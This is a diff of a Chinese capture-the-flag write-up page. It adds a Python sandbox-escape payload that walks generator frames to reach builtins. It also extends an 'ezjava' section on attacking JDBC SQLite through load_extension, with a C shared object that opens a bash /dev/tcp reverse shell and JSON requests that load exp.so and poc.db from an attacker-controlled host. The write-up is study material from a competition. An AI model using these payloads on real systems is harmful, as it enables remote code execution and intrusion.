@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/favicon.ico">
 <meta property="article:published_time" content="2024-05-20T05:30:13.000Z">
-<meta property="article:modified_time" content="2024-05-20T14:49:03.876Z">
+<meta property="article:modified_time" content="2024-05-21T04:50:36.592Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -178,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~35.99K
+                        ~36.91K
                     
                     字
                 </li>
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1716216543876"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1716267036592"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -437,6 +437,11 @@
 <p>因为比赛结束环境开不了了，所以只能本地复现了</p>
 <p>如果嫌麻烦可以拿到<code> builtins</code>的str函数把这个tuple变成str：</p>
 <img src="/posts/26055/24.png" class title="awa">
+<p>补一张复现的图，因为ctfshow没有国赛那个界面，所以显得很简陋，手动补<code>\n</code>换行和空格缩进即可</p>
+<img src="/posts/26055/37.png" class title="awa">
+<p>payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;def func():\n    def f():\n        yield g.gi_frame.f_back\n    g = f()\n    frame = [x for x in g][0]\n    builtin = frame.f_back.f_back.f_back.f_locals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;]\n    code = frame.f_back.f_back.f_back.f_code\n    str = builtin.str\n    print(code.co_consts[16:17][0][0:32])\nfunc()&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;def func():\n    def f():\n        yield g.gi_frame.f_back\n    g = f()\n    frame = [x for x in g][0]\n    builtin = frame.f_back.f_back.f_back.f_locals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;]\n    code = frame.f_back.f_back.f_back.f_code\n    str = builtin.str\n    print(code.co_consts[16:17][0][32:])\nfunc()&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 <h2><span id="ezjava"> ezjava</span></h2>
 <p>哈哈，没想到是jdbc打sqlite，失策了。死磕mysql的后果是目光呆滞</p>
 <p>后续学习jdbc attack的时候再把这几个数据库的打法整理以下</p>
@@ -476,7 +481,7 @@
 <p>回到这里，看看SqliteDatasourceConnector：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">SqliteDatasourceConnector</span><span class="params">(String url)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">    <span class="type">SQLiteConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SQLiteConfig</span>();</span><br><span class="line">    config.enableLoadExtension(<span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">this</span>.connection = DriverManager.getConnection(url, config.toProperties());</span><br><span class="line">    <span class="built_in">this</span>.connection.setAutoCommit(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>可以看到他这里允许加载extension，此时就可以利用 <code>&quot;CREATE VIEW &quot;</code>将不可控的SELECT语句转换为可控。</p>
-<p>如果我们能够控制SELECT语句，我们可以使用<code>SELECT load_extension('/tmp/test.so')</code>来加载<code>dll/so</code>并执行恶意代码</p>
+<p>如果我们能够控制SELECT语句，我们可以使用<code>SELECT load_extension('/tmp/test.so')</code>来加载<code>dll/so</code>并执行恶意代码，注意前面源码写入so的时候已经被重命名成<code>jdbc-sqlite-tmp-xxx.db</code>了，所以这个时候要变成<code>SELECT load_extension('/tmp/test.so')</code></p>
 <p>这里看以下su18师傅的<a target="_blank" rel="noopener" href="https://github.com/su18/JDBC-Attack/blob/main/sqlite-attack/src/main/java/org/su18/jdbc/attack/AttackSQLite.java">攻击示例</a>：</p>
 <img src="/posts/26055/30.png" class title="awa">
 <p>可以看到还需要读一次表，而这个DataSourceConnector里面就有这个操作，而我们只需要写好表名即可</p>
@@ -486,14 +491,21 @@
 <p>参考它可以先写一个恶意的so，<strong>类似</strong>下面这个形式<span class="blur">脑测太麻烦了，到时候更新正式wp的时候再改</span></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">    system(&#x27;bash -c &quot;bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>gcc编译成so：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC exp.c -o exp.so</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -shared -fPIC exp.c -o exp.so</span><br></pre></td></tr></table></figure>
 <p>写完so以后打一次请求(为什么用的是security，这个直接用的是现成的)：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:3, &quot;url&quot;:&quot;jdbc:sqlite::resource:http://ip:port/exp.so&quot;, &quot;tableName&quot;:&quot;security&quot;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:3, &quot;url&quot;:&quot;jdbc:sqlite::resource:http://ip:port/exp.so&quot;&#125;</span><br></pre></td></tr></table></figure>
 <p>本地跑一下这个<code>jdbc:sqlite::resource:http://ip:port/exp.so</code>计算出hashCode，记住他重命名为了<code>sqlite-jdbc-tmp-xxx.db</code></p>
 <p>su18师傅有现成的poc.db，下下来用就行了，表名就是security，把里面的内容改一改。这里可以用navicat改，也貌似可以用010Editor改</p>
 <p>第二次请求打poc.db：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:3, &quot;url&quot;:&quot;jdbc:sqlite::resource:http://ip:port/poc.db&quot;, &quot;tableName&quot;:&quot;security&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p>监听反弹的port，等shell弹过来即可，复现不了，等脑测</p>
+<p>监听反弹的port，等shell弹过来即可，比如我这里通过debug测得文件名为：<code>sqlite-jdbc-tmp--741179700.db</code></p>
+<p>此时请求如下：</p>
+<img src="/posts/26055/34.png" class title="awa">
+<img src="/posts/26055/33.png" class title="awa">
+<img src="/posts/26055/35.png" class title="awa">
+<p>shell就弹过来了：</p>
+<img src="/posts/26055/36.png" class title="awa">
+<p>可惜线上没做出来，只能复现了</p>
 </div>
         </div>
         
@@ -585,7 +597,7 @@
                     <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-05-20T14:49:03.876Z" itemprop="dateModified">最后编辑：2024-05-20</time>
+                    <time datetime="2024-05-21T04:50:36.592Z" itemprop="dateModified">最后编辑：2024-05-21</time>
                 </div>
             </div>
         </footer>
